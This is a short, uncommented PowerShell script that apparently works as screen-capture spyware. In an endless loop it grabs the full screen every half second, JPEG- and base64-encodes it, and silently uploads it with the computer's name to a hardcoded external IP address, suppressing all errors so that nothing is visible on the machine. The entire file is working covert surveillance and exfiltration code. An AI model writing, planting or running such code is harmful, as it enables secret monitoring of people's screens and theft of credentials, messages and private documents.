Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

try {
    Add-Type @"
using System;
using System.Runtime.InteropServices;
public class DPI {
    [DllImport("user32.dll")]
    public static extern bool SetProcessDPIAware();
}
"@
    [DPI]::SetProcessDPIAware() | Out-Null
} catch {}

$serverIP = "178.216.220.7"
$pcName = $env:COMPUTERNAME

while ($true) {
    try {
        $bounds = [System.Windows.Forms.SystemInformation]::VirtualScreen
        $bitmap = New-Object System.Drawing.Bitmap($bounds.Width, $bounds.Height)
        $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
        $graphics.CopyFromScreen($bounds.X, $bounds.Y, 0, 0, $bounds.Size)
        
        $ms = New-Object System.IO.MemoryStream
        $encoder = [System.Drawing.Imaging.Encoder]::Quality
        $encoderParams = New-Object System.Drawing.Imaging.EncoderParameters(1)
        $encoderParams.Param[0] = New-Object System.Drawing.Imaging.EncoderParameter($encoder, 85L)
        $jpegCodec = [System.Drawing.Imaging.ImageCodecInfo]::GetImageEncoders() | Where-Object { $_.MimeType -eq 'image/jpeg' }
        $bitmap.Save($ms, $jpegCodec, $encoderParams)
        
        $base64 = [Convert]::ToBase64String($ms.ToArray())
        
        Invoke-RestMethod -Uri "http://${serverIP}:8080/api/upload?pc=$pcName" -Method Post -Body $base64 -TimeoutSec 10 | Out-Null
        
        $bitmap.Dispose()
        $graphics.Dispose()
        $ms.Dispose()
    }
    catch { }
    
    Start-Sleep -Milliseconds 500
}